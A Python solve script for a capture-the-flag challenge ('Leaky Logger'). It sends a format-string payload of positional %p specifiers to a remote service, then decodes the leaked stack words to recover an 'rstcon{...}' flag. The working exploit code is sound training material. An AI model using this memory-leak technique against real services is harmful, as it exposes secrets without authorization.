#!/usr/bin/env python3
"""
Leaky Logger — format-string leak.

The logger reads flag.txt into an 80-byte stack buffer at [rbp-0x60], then does
printf(user_line) with the line we supply (at [rbp-0x260] == rsp). Our format
string is positional arg %6$, and the flag sits 0x200 bytes higher on the stack
(~%70$). The flag is inline stack data (not a pointer), so we leak raw qwords
with %p and decode them little-endian into ASCII.

Usage: ./solve.py [HOST] [PORT]
"""
import socket, sys, re

HOST = sys.argv[1] if len(sys.argv) > 1 else "18.215.143.250"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9002

LO, HI = 6, 95  # positional range to dump

def leak(lo, hi):
    payload = "".join(f"%{i}$p|" for i in range(lo, hi + 1)).encode() + b"\n"
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.sendall(payload)
    data = b""
    s.settimeout(3)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    s.close()
    return data

raw = leak(LO, HI)
print("[*] raw response:")
print(raw.decode(errors="replace"))

# Grab everything after "logged: " (the printf of our buffer)
after = raw.split(b"logged:", 1)[-1]
vals = re.findall(rb"0x[0-9a-fA-F]+|\(nil\)", after)

blob = b""
for v in vals:
    if v == b"(nil)":
        blob += b"\x00" * 8
        continue
    n = int(v, 16)
    # little-endian qword -> bytes (handles short values too)
    blob += n.to_bytes((max(n.bit_length(), 1) + 7) // 8 or 1, "little")

print("\n[*] decoded ASCII from leaked qwords:")
printable = "".join(chr(b) if 32 <= b < 127 else "." for b in blob)
print(printable)

m = re.search(rb"rstcon\{[^}]*\}", blob)
if m:
    print("\n[+] FLAG:", m.group().decode())
else:
    print("\n[-] flag pattern not found in this range; widen LO/HI.")
